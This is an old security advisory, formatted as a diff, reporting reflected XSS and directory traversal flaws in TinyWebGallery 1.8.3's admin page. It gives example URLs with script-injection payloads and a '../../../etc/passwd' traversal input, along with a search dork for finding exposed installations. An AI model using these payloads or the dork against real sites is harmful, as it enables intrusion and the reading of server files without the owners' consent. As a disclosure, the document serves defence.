@@ -1,0 +1,37 @@
+Date: 01/02/2011 (dd/MM/yyyy)
+Script: TinyWebGallery
+Version: 1.8.3 (No fixes yet, might work on other versions too).
+Home: http://www.tinywebgallery.com
+
+--
+
+Vulnerability: Non-persistent XSS
+Where:
+~ File: /admin/index.php
+~ Parameters: sview, tview, dir, item.
+
+Examples:
+http://localhost/twg183/admin/index.php?sview="onmouseover=alert(String.fromCharCode(88,83,83));"
+http://localhost/twg183/admin/index.php?tview="onmouseover=alert(String.fromCharCode(88,83,83));"
+http://localhost/twg183/admin/index.php?dir=<script>alert("xss")</script>
+http://localhost/twg183/admin/index.php?action=chmod&item=<script>alert("xss")</script>
+http://localhost/twg183/twg183/admin/index.php?action=chmod&item="><script>alert("xss")</script>
+...
+
+--
+
+Vulnerability: Directory Traversal.
+Where:
+~ File: /admin/index.php
+~ Parameters: item
+
+Example:
+http://localhost/twg183/admin/index.php?action=edit&item=../../../etc/passwd
+
+--
+
+Dork: "Photo Gallery powered by TinyWebGallery 1.8.3" (about 1.46M results)
+
+- Yam Mesicka
+- Israel
+- www.Mesicka.com
